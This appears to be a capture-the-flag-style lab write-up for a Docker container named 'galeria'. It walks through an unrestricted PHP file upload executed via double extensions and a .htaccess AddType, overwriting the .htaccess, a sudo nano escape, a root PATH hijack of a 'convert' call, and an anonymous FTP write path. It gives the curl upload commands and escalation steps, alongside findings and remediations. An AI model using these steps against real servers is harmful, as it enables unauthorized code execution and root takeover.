# 77 galeria — writeup

**Lab:** 77 · *galeria* · **fácil**
**Catalogue entry (verbatim, `tooling/labs.manifest:82`):** `77|galeria|facil|simple web fuzzing and a file upload vulnerability`
**Target:** `172.17.0.5` — single container `galeria_container`, image `galeria:latest`.
**Result:** anonymous → code execution as **`uid=33(www-data)`** → **`uid=1001(gallery)`** → **`uid=0(root)`**, three hops, each identity measured at its own hop and each proved by a root- or gallery-owned artefact read back out of band.
**No `FLAG{}`** — reported as a measured absence with two independent searches and counts (§9).

---

## 0. The direct answer: does the upload class hold, or does this lab correct it?

**The class holds, and this lab is the first instance in the corpus where the *middle* check is both live and load-bearing — which corrects the one generalisation that lab 146's writeup invites you to make.**

The shape the corpus arrived at (lab 12's §0/§10, lab 146's F1) is: *the extension allowlist is only one of three independent checks, and they are routinely evaluated on different inputs.* That is **confirmed here, in a stronger form**, because the application has **no check at all** and the three-way disagreement therefore happens one level down, between the two server-side checks:

| The three checks | What it is in this artefact | Verdict from the artefact |
|---|---|---|
| **1. the application's own test** | `handler.php` — **no extension test exists** | accepts **every** name (16 of 16 probed) |
| **2. the web server's filename map** | `/etc/apache2/mods-available/php8.3.conf:29-31` | executes `.php` **and** `.php.<anything>` |
| **3. the filter in between** | `images/.htaccess:2` `AddType application/x-httpd-php …` | executes `.php5`, which check 2 **refuses** |

**The correction, stated precisely.** Lab 146 concluded that a per-directory `.htaccess` can be the inert one, and the corpus recorded it as "the one that named the exact behaviour was the dead one". That is true *of lab 146* — where `AllowOverride None` had disabled it — and it is **not** a property of `.htaccess` files. Here `sites-enabled/000-default.conf:23-26` grants `AllowOverride All` on the images directory, the file **is** read, and it is the **only** thing that makes `.php5` execute. The same directive class is dead in one lab and decisive in another. So the rule that survives is narrower and better:

> **Never decide whether a per-directory file speaks from its content or from its name. Read `AllowOverride` first, then prove it with a differential — because the same directive is inert in one target and decisive in another, and only the differential tells you which one you are looking at.**

And lab 12's better question survives verbatim, with one substitution forced by this artefact: lab 12 asked *"do the app's extension test and the server's filename test accept the same name set?"* Here there is no app test, so the question has to be asked of the two that remain — **"do the server's filename test and the directory's type test accept the same name set?"** They do not, and §4 measures the disagreement with a four-state differential rather than by reading.

---

## 1. Surface

```
$ nmap -sV -Pn -p- --min-rate 2000 172.17.0.5
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Not shown: 65533 closed tcp ports (conn-refused)
```

**2 TCP ports, 65 533 closed.** The non-TCP surface was read from `/proc`, not inferred:

```
$ grep -E ":0015|:0050" /proc/net/tcp        # 0015=21  0050=80, state 0A = LISTEN
   0: 00000000:0050 00000000:0000 0A …
   1: 00000000:0015 00000000:0000 0A …
$ cat /proc/net/udp
    sl  local_address rem_address  st …      # header only — 0 UDP sockets bound
```

`nmap -sU` was not attempted (needs root, unavailable on this host). The corroboration ladder I do have: the image's declared `EXposedPorts` are exactly `{"21/tcp":{},"80/tcp":{}}`, `/proc/net/tcp` shows exactly those two listeners, and `/proc/net/udp` is empty. A UDP service is possible in principle and I have no evidence against one; I simply could not look.

`ss` is **not installed** in this image. My first "listener count" was `ss -lnt | wc -l` → **0**, which is `sh: ss: command not found` wearing a zero — see §8.1.

---

## 2. What the artefact actually is — and was the manifest's label right?

Read from version-bearing files and the package database, before any request that mattered.

```
$ docker inspect -f 'ENTRYPOINT={{json .Config.Entrypoint}} EXPOSED={{json .Config.ExposedPorts}}' galeria:latest
ENTRYPOINT=["/etc/.netd-entry"] EXPOSED={"21/tcp":{},"80/tcp":{}}

$ head -3 /etc/os-release
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"

$ dpkg -l apache2 php8.3 libapache2-mod-php8.3 vsftpd | grep ^ii
ii  apache2               2.4.58-1ubuntu8.5      amd64  Apache HTTP Server
ii  libapache2-mod-php8.3 8.3.6-0ubuntu0.24.04.3 amd64  server-side, HTML-embedded scripting language (Apache 2 module)
ii  vsftpd                3.0.5-0ubuntu3.1       amd64  lightweight, efficient FTP server built for security
```

| Axis | Manifest says | Artefact says | Verdict |
|---|---|---|---|
| Class | *"simple web fuzzing and a file upload vulnerability"* | one unauthenticated upload endpoint at a non-guessable-but-fuzzable path, **plus a second write primitive on FTP that the catalogue does not mention**, plus a two-hop sudo ladder | **right, and incomplete** |
| Platform | (not named) | Ubuntu 24.04.1, Apache httpd 2.4.58, PHP 8.3.6 `mod_php`, vsftpd 3.0.5 | — |
| Service count | (not named) | **two** listeners, not one web port | **the FTP half is undeclared** |

**The manifest's label is a filename, and here it is not wrong** — which is itself worth saying, because rule 1 of the brief is about the queue's *platform* label being wrong three times out of five. What the label is wrong about is **completeness**: the entry names one vulnerability and the image ships a three-hop chain. The upload is the *entry*, not the finding.

The entrypoint is the whole configuration:

```bash
# /etc/.netd-entry, in full
#!/bin/bash
service apache2 start
service vsftpd start
tail -f /dev/null
```

`auto_deploy.sh` was **read, never run** (it ends in `while true; do sleep 1; done` at line 145). It creates **no network**: a bare `docker run -d --name $CONTAINER_NAME $IMAGE_NAME` at line 131, one container, no macvlan, no `--internal`, no second host. The engagement stayed single-host.

---

## 3. Source read before the first request that mattered

The whole application is three files, and all three fit in one screen.

```php
# /var/www/html/gallery/uploads/handler.php, in full — 17 lines
 1  <?php
 2  if (isset($_FILES['image'])) {
 3      $upload_dir = __DIR__ . '/images/';
 4      $upload_file = $upload_dir . basename($_FILES['image']['name']);
 5
 6      if (move_uploaded_file($_FILES['image']['tmp_name'], $upload_file)) {
 7          echo "Archivo subido exitosamente: " . htmlspecialchars($_FILES['image']['name']);
 8      } else {
 9          echo "Error al subir el archivo.";
10      }
11  }
12  ?>
```

**Read what this code does not say.** There is no `pathinfo`, no extension allowlist, no `getimagesize()`, no `finfo`, no content sniff, no size cap, no session, no token, no rate limit. The stored name is `basename()` of the client-supplied name, so the attacker controls the name completely. `basename()` does neutralise traversal — measured, not assumed (§6) — but a name it cannot shorten is still an arbitrary name.

```apache
# /var/www/html/gallery/uploads/images/.htaccess, in full — 11 lines
 1  # Forzar ejecución como PHP si termina en .php o .php.*
 2  AddType application/x-httpd-php .php .php5 .php.jpg .php.jpeg .php.png .php.gif .php.webp
 3
 4  # Permitir servir cualquier tipo de archivo normalmente
 5  AddType image/jpeg .jpeg .jpg
 6  AddType image/png .png
 7  AddType image/gif .gif
 8  AddType image/webp .webp
 9
10  # Opcional: evitar listado de archivos
11  Options +Indexes
```

The comment on line 10 says *"Opcional: evitar listado de archivos"* — **avoid listing of files** — and the directive **enables** it. That is the same class of decoy lab 146 found, in a single line, and it is a comment that names the opposite of what it does.

```apache
# /etc/apache2/mods-available/php8.3.conf:29-31  (the operative directive)
29  <FilesMatch "\.php(\..+)?$">
30      SetHandler application/x-httpd-php
31  </FilesMatch>
```

Lines 1–27 of that file are the stock Ubuntu `mod_php` configuration. **Lines 29–31 are not**, and that is not recall — it is the package's own checksum database:

```
$ dpkg -S /etc/apache2/mods-available/php8.3.conf
libapache2-mod-php8.3: /etc/apache2/mods-available/php8.3.conf

$ dpkg -V libapache2-mod-php8.3
??5?????? c /etc/apache2/mods-available/php8.3.conf

$ dpkg -V php8.3 ; echo "rc=$?"          # the WRONG package: silent
rc=0
```

`??5??????` is `dpkg`'s field layout: the **md5sums** field (position 5) and nothing else. The file was modified after `dpkg` installed it. Two things follow, and both are reusable:

- `dpkg -V <wrong-package>` is silent and exits 0. The first `dpkg -V php8.3` I ran "verified" this file clean because the file belongs to `libapache2-mod-php8.3`, not `php8.3`. **A verifier pointed at the wrong package is a verifier that has not looked** — the same root as `self-corrections.md` §11–§14, reached a new way.
- `dpkg -V` over the whole tree returns **5 490 lines**, almost all `missing /usr/share/doc/...` and `missing /usr/share/man/...` from image slimming. A sweep that noisy needs a filter, and the filter needs a positive control.

---

## 4. The three checks, and the four-state differential that decides between them

### The name matrix — 9 names, every fetch anonymous with **no cookie jar**

Payload = PHP that prints `posix_getuid()`, `php_sapi_name()` and `/proc/self/status`. Uploaded with `curl -F`, fetched with a bare `curl` that has never seen a cookie.

| Stored name | `POST` result | `GET` status | `Content-Type` served | Verdict |
|---|---|---|---|---|
| `poc3.php` | `Archivo subido exitosamente` | `200` | `text/html; charset=UTF-8` | **EXECUTED** `uid=33` |
| `poc3.php.jpg` | accepted | `200` | `text/html; charset=UTF-8` | **EXECUTED** `uid=33` |
| `poc3.php5` | accepted | `200` | `text/html; charset=UTF-8` | **EXECUTED** `uid=33` |
| `poc3.phtml` | accepted | `200` | `text/html; charset=UTF-8` | **EXECUTED** `uid=33` |
| `poc3.css.php` | accepted | `200` | `text/html; charset=UTF-8` | **EXECUTED** `uid=33` |
| `poc3.jpg` | accepted | `200` | `image/jpeg` | served verbatim, 690 B, **not executed** |
| `poc3.css` | accepted | `200` | `text/css` | served verbatim, 690 B, **not executed** |
| `poc3.txt` | accepted | `200` | `text/plain` | served verbatim, 690 B, **not executed** |
| `poc3.phps` | accepted | `403` | — | denied by the stock `Require all denied` on `\.phps$` |

**9 of 9 accepted by the application.** There is no application check, so check 1 accepts the whole universe. Every execution verdict above is the *product of the two server-side checks*, and they are the ones that disagree.

### Four-state differential — the same five files, changing only the state of `images/.htaccess`

Shipped file: `362` B, `www-data:www-data 644`, `md5 ead3bfa54720efca3b7bd38bc94b27d8`.

| File | A: shipped | B: stripped to `Options +Indexes` only | C: deleted | D: restored byte-exact |
|---|---|---|---|---|
| `poc.php` | **EXECUTED** | **EXECUTED** | **EXECUTED** | **EXECUTED** |
| `poc.php.jpg` | **EXECUTED** | **EXECUTED** | **EXECUTED** | **EXECUTED** |
| `poc.php5` | **EXECUTED** | served verbatim | served verbatim | **EXECUTED** |
| `poc.jpg` | served verbatim | served verbatim | served verbatim | served verbatim |
| `poc.txt` | served verbatim | served verbatim | served verbatim | served verbatim |

Read the table as two separate findings, because they are two:

- **`.php` and `.php.jpg` execute in all four states** ⇒ the cause is **not** in the upload directory. It is `php8.3.conf:29-31`, which is global. Confirmed by placing the same payload where no `.htaccess` applies at all: `GET /dl77_docroot.php.jpg` → `200`, `text/html`, **executed**; `GET /gallery/uploads/dl77_up.php.jpg` → **executed**.
- **`.php5` flips** ⇒ `images/.htaccess` **is** read (`AllowOverride All`, `sites-enabled/000-default.conf:23-26`) and **is** load-bearing. The filename map `\.php(\..+)?$` refuses `.php5`; the `AddType application/x-httpd-php .php5` on line 2 of the `.htaccess` is the only thing that executes it.

**The two checks disagree on exactly one name in my matrix, and the name where they disagree is the name that works.** That is lab 12's contribution, relocated one level down.

### The `Options +Indexes` line is inert

```
state A (shipped .htaccess):   GET /gallery/uploads/images/ -> 200  12657 B
.htaccess absent:              GET /gallery/uploads/images/ -> 200  12651 B
restored:                      GET /gallery/uploads/images/ -> 200  12657 B
```

The listing survives without it, because `apache2.conf:170-174` already sets `Options Indexes` on `/var/www/`. **So the upload directory ships two directives that look protective and one that is protective: the `.htaccess` is half-live.** Line 2 of it is decisive; line 11 is decorative; the comment above line 11 states the opposite of what line 11 does.

---

## 5. Three states in one directory — "uploaded" and "executed" are different claims

Lab 12's measurement discipline, repeated here. All four rows are the same 690-byte payload, the same directory, the same session, fetched anonymously.

| # | Name | On disk | HTTP | `Content-Type` | Body | What it proves |
|---|---|---|---|---|---|---|
| 1 | `poc3.php` | 690 B, `www-data:www-data 644` | `200` | `text/html; charset=UTF-8` | 114 B of `posix_getuid()` output | **the engine runs inside `images/`** |
| 2 | `poc3.php.jpg` | 690 B, `www-data:www-data 644` | `200` | `text/html; charset=UTF-8` | 114 B | **a double extension executes** — the lab's own new state |
| 3 | `poc3.jpg` | 690 B | `200` | `image/jpeg` | the PHP **source, verbatim**, 690 B | **uploaded, not executed** — PHP inside a `.jpg` is data |
| 4 | `poc3.txt` | 690 B | `200` | `text/plain` | `NOT-PHP`-equivalent, 690 B | **positive control**: the path is reachable and the fetch is not lying |

Row 3 is the one that keeps the claim honest. **A 200 that renders a 690-byte page is not execution** — rows 3 and 4 are also 200s, and the discriminator is the *body*, not the status.

Row 2's `Content-Type` is worth a second look: it is `text/html`, **not** `image/jpeg`, even though `.htaccess:5` maps `.jpg` to `image/jpeg`. `SetHandler` overrides the type. The served type tells you nothing about who won.

---

## 6. Controls that held, and the fuzzing half

### The impossible-name control ran **first**, and the sweep is therefore trustworthy

Lab 87's phantom-301 shape did **not** occur here, and the reason is that the control was measured before the sweep, not after:

```
CONTROL /zzq7x9f2a-nonexistent-control-8f2a91/deep.html -> (404, 'text/html; charset=iso-8859-1', 272, 'c9ed091c5471')
```

272 bytes, `404`, and a body hash that is **distinct from every other response in the run**. Any name the sweep reported is a deviation from *that*, not from nothing.

### Wordlist sweep — 69 names × 2 prefixes = **138 requests**, 6 deviations

```
  /.htaccess                                (403, 275 B, 22ef8c435b79)
  /gallery/uploads/.htaccess                (403, 275 B, 22ef8c435b79)
  /gallery/uploads/handler.php              (200, 148 B, b2df19900435)   <- the entry point
  /gallery/uploads/images                   (200, autoindex)
  /index.html                               (200, 1772 B)
  /server-status                            (403, 275 B)                <- mod_status loaded but restricted

tested=138 candidates=69 deviations_from_control=6
```

The three `403`s are **byte-identical** (`22ef8c435b79`) — they are one Apache error page reached three ways, not three different verdicts. `/server-status` is a real module (`mods-enabled/status.load`) answering a real restriction; that is a *scanner* result about `mod_status`, not a finding.

**Path traversal was tested and did not work**, with a positive control on the same code path (`basename()`, `handler.php:4`):

| Sent `filename=` | Server's confirmation message | On disk |
|---|---|---|
| `../../../tmp/DL77trav.php` | `Archivo subido exitosamente: DL77trav.php` | `DL77trav.php` inside `images/` |
| `....//....//tmp/DL77trav2.php` | `Archivo subido exitosamente: DL77trav2.php` | `DL77trav2.php` inside `images/` |
| `/tmp/DL77trav*` | — | **does not exist** (0 files) |

`basename()` holds. Reported as a control that held, not as an absence.

### Arbitrary overwrite of a shipped asset — and of the `.htaccess` itself

```
before: 0b5131aa6eb53a9f4cf52f5673f90537  image_1.jpg
after : 4515b8d3da094c65311ae482cf49a402  image_1.jpg   (26 B: "GIF89a-OVERWRITTEN-BY-DL77")
```

`move_uploaded_file` truncates in place, so the endpoint overwrites any `www-data`-owned file in `images/`. The same primitive with `filename=".htaccess"` replaced the 362-byte control with 690 bytes of my own PHP. That is F2, and it is also my worst instrumentation defect (§8.4).

### The sudo grant is properly scoped — four negative controls, one positive

```
$ sudo -n -l                                    # as www-data, read inside the uploaded script
Matching Defaults entries for www-data on bcd2d5855d9a:
    env_reset, mail_badpass, use_pty

User www-data may run the following commands on bcd2d5855d9a:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano

  sudo -n -u gallery /bin/bash -c id    ->  sudo: a password is required
  sudo -n -u gallery /usr/bin/id        ->  sudo: a password is required
  sudo -n -u root     /bin/nano --version -> sudo: a password is required
  sudo -n -u www-data /bin/nano --version -> GNU nano, version 7.2      <- POSITIVE
  sudo -n -l -U gallery                  ->  Sorry, user www-data is not allowed to execute 'list' as gallery …
```

Scoped to **one target user** and **one program**, and the detector discriminates: three denies and one grant on the same predicate in the same shell. Note there is **no `secure_path`** in effect for `www-data` (`sudo -n -l` shows no `secure_path` default) and `%sudo`/`%admin` do not list `www-data`.

---

## 7. The chain — three hops, `uid`/`euid` at every one, each proved out of band

| # | → | Mechanism | Identity proof (verbatim, at the hop) |
|---|---|---|---|
| 0 | anonymous | unauthenticated multipart `POST` to `/gallery/uploads/handler.php`; name is attacker-chosen; no filter | no session exists to prove — there is no auth at all |
| 1 | `uid=33(www-data)` | `poc.php.jpg` stored in `images/` and executed by `php8.3.conf:29-31` | `PROC\|Uid: 33 33 33 33`, `POSIXUID=33 POSIXEUID=33`, `SAPI=apache2handler`, `shell_exec('id')` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 1b | (second writer) `uid=101(ftp)` | anonymous FTP `STOR` into the pre-seeded `ftp/` subdirectory | on-disk owner `ftp:ftp 644`; `getent passwd ftp` → `ftp:x:101:103:…` |
| 2 | `uid=1001(gallery)` | `sudo -n -u gallery /bin/nano` (grant, no argument list ⇒ any argv) → nano `^T Execute` | artefact `/tmp/DL77_esc.txt` owned `gallery:gallery`, contents `uid=1001(gallery) gid=1001(gallery) groups=1001(gallery)` |
| 3 | `uid=0(root)` | `sudo -n /usr/local/bin/runme` as `gallery`; `runme` is a **driver** that `system()`s the bare name `convert`; `PATH` is hijacked so `convert` resolves to a file `gallery` owns | artefact `/tmp/DL77_root.txt` owned **`root:root`**, contents `uid=0(root) gid=0(root) groups=0(root)` |

### Hop 0 → 1, in full, anonymous and cookieless

```
$ curl -F "image=@payload2.php;filename=poc_final.php.jpg" http://172.17.0.5/gallery/uploads/handler.php
Archivo subido exitosamente: poc_final.php.jpg

$ curl -s http://172.17.0.5/gallery/uploads/images/poc_final.php.jpg
PROC|Uid:	33	33	33	33
PROC|Gid:	33	33	33	33
PROC|Groups:	33
PROC|CapEff:	0000000000000000
PROC|CapBnd:	000000000a80425fb
PROC|NoNewPrivs:	0
PROC|Seccomp:	2
POSIXUID=33 POSIXEUID=33
SAPI=apache2handler
SCRIPT=/var/www/html/gallery/uploads/images/poc_final.php.jpg
ST_OWNER=33
ST_MODE=644
```

**`Uid: 33 33 33 33` is real, effective, saved and filesystem — all four — so there is no setuid transition at this hop**, and `CapEff` is all zeros. `NoNewPrivs: 0` and `Seccomp: 2` are recorded because they decide whether hop 2 or 3 could gain anything.

**Oracle manufactured before it was trusted.** The execution is the result, but the *write* needed its own proof, so the payload also wrote a uniquely-marked file into a path only the Apache identity can create, and I read it back twice — as root and as `www-data`:

```
$ docker exec galeria_container ls -l /tmp/DL77MARK-8f3a2c17b4.proof
-rw-r--r-- 1 www-data www-data 42 Sep 30 14:45 /tmp/DL77MARK-8f3a2c17b4.proof
$ docker exec -u www-data galeria_container cat /tmp/DL77MARK-8f3a2c17b4.proof
DL77MARK-8f3a2c17b4 uid=33 time=1790801111
```

### Hop 2 → 3, with a paired control **in a single run**

`/usr/local/bin/runme` is `740 root:gallery`, 16 000 B, an ELF whose only two library calls are `puts` and `system`. Read as `gallery` (the group has `r--`), its strings are the whole mechanism:

```
Converting image...
convert /var/www/html/gallery/uploads/images/input.png /var/www/html/gallery/uploads/images/output.jpg
Done.
```

The command is **hardcoded** — no arguments reach it, so argument injection is off the table. What reaches it is the **name** `convert`, resolved through `PATH`. And the sudoers file, quoted in full from the artefact, has the two decisions that make that fatal:

```apache
# /etc/sudoers
# Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults:gallery        env_keep += "PATH"
Defaults	use_pty
…
gallery ALL=(ALL) NOPASSWD: /usr/local/bin/runme
…
www-data ALL=(gallery) NOPASSWD: /bin/nano
www-data ALL=(www-data) NOPASSWD: /bin/nano
```

`secure_path` is **commented out**; `env_keep += "PATH"` is **active, scoped to `gallery`**. So `gallery` chooses the prefix list, and `runme` — running as `uid=0` — resolves its subprogram out of it. One run, both arms:

```
whoami=gallery PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
--- planted ---
-rwxr-xr-x 1 gallery gallery 463 Sep 30 14:54 /tmp/dl77p/convert
--- control: runme with the normal PATH ---
sh: 1: convert: not found
Converting image...
Done.
rc=0
--- treatment: runme with /tmp/dl77p prepended ---
Converting image...
Done.
rc=0
--- artifact? ---
-rw-r--r-- 1 root root 1285 Sep 30 14:54 /tmp/DL77_root.txt
```

The control arm and the treatment arm differ by **one environment variable**, in the same script, in the same second. The root-owned artefact is the oracle: it could not exist unless the hijacked `convert` ran as `uid=0`.

**This is lab 146's F4 shape, in a different body.** `gcc -B` there, `runme`→`convert` here. The transferable sentence is unchanged: **when a privilege grant names a program, the grant's attack surface is the program *and every path that program resolves other programs through*.** Ask what it `execve`s, and who can write to the directories it looks in.

### Hop 1b — the undeclared second write identity

```
vsftpd 3.0.5, anonymous login OK.
STOR <chroot root>/DL77ftp_root.php      -> 553 Could not create file.    (images/ is 0755 www-data)
MKD dl77dir                               -> 550 Create directory operation failed.
STOR ftp/DL77ftp_<fresh>.php.jpg          -> OK
STOR ftp/<same name> again                -> 553 Could not create file.  (vsftpd will not overwrite)
```

Only the pre-seeded `0777` `ftp/` subdirectory accepts writes, and only for a name that does not already exist. The file it accepts is **authored by a different uid than the HTTP uploader**:

```
$ stat -c "%n %U:%G %a" …/images/ftp/DL77ftp_1790801817.php.jpg …/images/ftp
…/images/ftp/DL77ftp_1790801817.php.jpg ftp:ftp 644
…/images/ftp                                nobody:nogroup 757
$ getent passwd ftp
ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

$ curl -s …/images/ftp/DL77ftp_ftp.php.jpg        # anonymous, no cookie
FTP-FTP uid=33 euid=33  [200 text/html; charset=UTF-8]
```

**Authored by `uid=101(ftp)`, executed by `uid=33(www-data)`.** The `.htaccess` and the global map both apply to the subdirectory, so the FTP write needs no new technique — but it is a second, independently reachable write primitive that the catalogue entry does not mention, and it is the reason `images/ftp` ships in the image at all.

---

## 8. Instrumentation defects — mine, and four of them produced clean wrong output

### 8.1 `ss` is not installed, and it printed a zero

`ss -lnt | wc -l` → `0` listeners, immediately after the service was serving three processes. `sh: ss: command not found`, and the pipe swallowed it. I would have reported "0 listening sockets on the restored container" — a claim about the instance, dressed as a verification of the restore. Replaced with `/proc/net/tcp`, which shows both listeners. **`self-corrections.md` §11 exactly: a missing command is visible, but a missing command behind a pipe is not.**

### 8.2 `find -perm -u+w` produced **14 101** "writable" files and **zero** of the six I checked were writable by the writer

This is the corpus's most-recorded trap and I walked into it through a different door — not `docker exec` as root, but a **mode bit read as a permission**.

```
$ (as www-data, inside the container)
$ find / -xdev -perm -u+w -type f 2>/dev/null | grep -vE "^/(proc|sys|tmp|var/www)" | wc -l
14101
$ stat -c "%n %U:%G %a" /etc/apache2/apache2.conf /etc/apache2/envvars /etc/.pwd.lock
/etc/apache2/apache2.conf root:root 644
/etc/apache2/envvars        root:root 644
/etc/.pwd.lock              root:root 600
```

`-u+w` is the **owner's** write bit. It is set on every root-owned 644 file in the filesystem, so it says nothing at all about `www-data`. The same predicate as the writing identity, in the same shell, in the same second:

```
  test -w /etc/apache2/apache2.conf                    NOT-WRITABLE
  test -w /etc/apache2/envvars                         NOT-WRITABLE
  test -w /etc/adduser.conf                            NOT-WRITABLE
  test -w /etc/.netd-entry                             NOT-WRITABLE
  test -w /etc/apache2/mods-available/php8.3.conf      NOT-WRITABLE
  test -w /etc/vsftpd.conf                             NOT-WRITABLE
  test -w /var/www/html/gallery/uploads/handler.php    WRITABLE      <- the positive control
```

and the real write, with a marker and a before/after hash, because a predicate is a claim:

```
  /etc/apache2/apache2.conf  put_contents=false  before=d9c3dba8…  after=d9c3dba8…
  /etc/apache2/envvars       put_contents=false  before=e4431a53…  after=e4431a53…
```

For contrast, the same `test -w` **run as root through `docker exec`** — the thirteen-engagement trap the corpus already documents:

```
WRITABLE(as root) /etc/apache2/apache2.conf
WRITABLE(as root) /etc/vsftpd.conf
WRITABLE(as root) /etc/.pwd.lock
```

**Three different instruments, three different answers to the same question, and only one of them was about the boundary I cared about.** The positive control is what made the difference: `handler.php` is `WRITABLE`, and I know independently that it is, because I had just uploaded over it.

### 8.3 `getmyuid()` returned `0` and I nearly wrote "the payload ran as root"

My first probe printed `getmyuid()`. For a `www-data`-owned file that returns `33` **by coincidence** — `getmyuid()` is *the owner of the current PHP script*, not the process identity. When I copied the same payload into the document root as `root:root 644`, the probe printed `uid=0 euid=0` and, three lines later, `uid=33(www-data)`. The contradiction was inside one response.

```
EXEC DL77MARK-8f3a2c17b4 uid=0 euid=0
uid=33(www-data) gid=33(www-data) groups=33(www-data)
SAPI=apache2handler
```

Had I quoted the first line I would have filed a root execution that does not exist. Fixed by replacing it with `posix_getuid()` **and** `/proc/self/status`, which is what §5 and §7 report. The corroborating control that proved the server was not simply skipping an unreadable file:

```
  /dl77_m600.php  (root:root 600)  -> 500
  /dl77_m644.php  (root:root 644)  -> MODE644-ROOT: RAN uid=33
```

**A `0` from an identity getter is a statement about the file, not about the process.**

### 8.4 I destroyed the artefact I was measuring, and only the directory listing told me

Uploading with `filename=".htaccess"` replaced the 362-byte control with 690 bytes of my own PHP — the directory is `www-data`-owned and `move_uploaded_file` truncates in place. The four-state differential had already completed, so the measurements stand, but the control was gone and the lab was left in a state I had not intended. Repaired from a copy taken **before** the experiment: `md5 ead3bfa54720efca3b7bd38bc94b27d8`, `diff` clean, `www-data:www-data 644`, and state A re-measured afterwards with the same three EXECUTED / two verbatim results.

Read back after writing, every time, and take the copy before the experiment, not after.

### 8.5 `grep -rIl` reported nothing on a directory that contains the string

My first reward sweep used `-I` (ignore binary). Its positive control — *search for a string I know is present* — came back empty on `/usr/local/bin`:

```
$ grep -rl  (no -I, no -a) on /usr/local/bin/ : 1
$ grep -rIl (WITH -I, ignore binary)          : 0     <- the control, reporting "nothing found"
$ grep -ral (WITH -a, binary as text)         : 1
$ strings -a /usr/local/bin/runme | grep -c "Converting image"
1
```

**`self-corrections.md` §12, reached through `grep` instead of `strings`.** Had the control not been there, the sweep's "0 matches" would have been filed as a property of the target.

### 8.6 Two smaller ones, for the record

- **`curl -F "…;filename=a b;DROP.php"` stored a file called `a b`.** `;` is `curl`'s own option separator inside `-F`; the client truncated the name, not the server. Reading that as a server-side sanitiser would have been a fabricated control.
- **`dpkg -V php8.3` returned `rc=0` and no output** about a file that had been modified, because the file belongs to `libapache2-mod-php8.3`. A verifier pointed at the wrong package is a verifier that has not looked.

---

## 9. Findings

### F1 — Unrestricted upload into an executable directory; a double extension reaches `uid=33(www-data)` (CWE-434, CWE-16)

`handler.php` has **no** extension, content or size check (17 lines, quoted in §3), stores the client-supplied basename into a directory the server executes, and the engine is unrestricted over that directory. `.php` and `.php.jpg` both execute; `.jpg` does not; `.css` does not. Unauthenticated. **Impact:** unauthenticated RCE as `www-data`, which is floor 0 of a three-hop chain to `uid=0` (§7). **Root cause:** two decisions, not one — the missing application check, *and* the lab-injected `php8.3.conf:29-31`. **Remediation:** validate the extension *and* the bytes server-side; generate the stored name instead of trusting `basename()`; store uploads outside the document root; and delete `php8.3.conf:29-31`, which is what makes a double extension enough. Patching `handler.php` alone leaves the FTP write and every other writer working.

### F2 — The only per-directory control is writable through the vulnerability it protects (CWE-434 + CWE-732)

```
$ curl -F "image=@payload2.php;filename=.htaccess" http://172.17.0.5/gallery/uploads/handler.php
Archivo subido exitosamente: .htaccess
```

`images/` is `drwxr-xr-x www-data www-data` and `.htaccess` is `www-data:www-data 644`, so the same anonymous request that exploits the upload can **rewrite or delete the upload directory's own configuration** — and `AllowOverride All` means whatever it writes is honoured. Impact: the exposure survives any fix applied to the handler if the fix does not also make the directory `root`-owned, and an attacker can *add* mappings rather than only exploit existing ones. Remediation: `images/` `root:root`, uploads written by a privileged helper, `AllowOverride None` on the tree.

### F3 — `sudo` grants a general-purpose editor with a built-in command-execution feature, across a target account (CWE-269, CWE-250)

`www-data ALL=(gallery) NOPASSWD: /bin/nano`, with no argument list, so any argv. nano 7.2's `^T Execute` runs a command as the nano process user, which here is `gallery`. Scoped to one program and one user — three negative controls refused and one granted on the same predicate — so this is a finding about **the named program**, not about sudo being open. Remediation: never grant an editor to a daemon account; point the grant at a purpose-built non-interactive script that takes its input as data, and pin the arguments.

### F4 — A granted driver resolves its subprogram out of a `PATH` the grantee controls (CWE-426, CWE-269) — the escalation that worked

`gallery ALL=(ALL) NOPASSWD: /usr/local/bin/runme`. `runme` hardcodes `system("convert /var/www/html/gallery/uploads/images/input.png …")`. The sudoers file has `secure_path` **commented out** and `Defaults:gallery env_keep += "PATH"` **active**. A file named `convert`, owned by `gallery`, in a directory `gallery` can create, is what `runme` executes — **as `uid=0`**. Proved with a paired control in one run (§7) and a `root:root` artefact. Remediation: uncomment `secure_path`; delete `env_keep += "PATH"`; make `runme` a script that resolves its dependency by absolute path; and never grant a driver that `exec`s a bare name to a non-root account. **F3 and F4 are separate findings with separate remediations** — fixing the nano grant does not touch the `PATH` grant, and both are named so that a reviewer who patches one is told the other is still there.

### F5 — A second, undeclared write primitive: anonymous FTP upload into the same executable tree (CWE-434, CWE-22)

`vsftpd 3.0.5` with `anonymous_enable=YES`, `anon_upload_enable=YES`, `anon_root=/var/www/html/gallery/uploads/images`, `allow_writeable_chroot=YES`, `pasv_enable=NO`. The pre-seeded `0777 nobody:nogroup` `images/ftp` accepts `STOR` of a **new** name; the chroot root itself does not (`553`), and `MKD` is refused (`550`). A file stored there is authored by `uid=101(ftp)` and executes as `uid=33(www-data)`. The catalogue entry does not mention FTP at all. Remediation: if FTP is not a requirement, remove the service; if it is, chroot it somewhere outside the document root and re-enable `pasv_enable` with a restricted port range.

### F6 — Directory indexing over the upload directory makes every payload enumerable (CWE-548)

`GET /gallery/uploads/images/` → `200`, 12 657 B of Apache autoindex, listing every uploaded artefact including the RCE payloads. Root cause is `apache2.conf:170-174` (`Options Indexes` on `/var/www/`), **not** the `.htaccess` — the `.htaccess`'s own `Options +Indexes` on line 11 is inert, and its comment on line 10 says the line *prevents* listing. Remediation: `Options -Indexes`, and stop shipping a comment that contradicts its directive.

### F7 — Every account's shell hash field is locked; there is no credential path (measured, reported as a control)

From `uid=0`: `/etc/shadow` shows `root:*:20115:…`, `daemon:*:…`, `bin:*:…`, `sys:*:…`. The only non-system account is `gallery:x:1001:1001::/home/gallery:/bin/sh`, and `su` to it fails with `Authentication failure` (no password set). There is no credential to shortcut the ladder with, so the floor count is a property of the policy rather than a plan.

---

## 10. Reward — measured absence

**There is no `FLAG{}` in this image.** Reported as a measurement, not an omission.

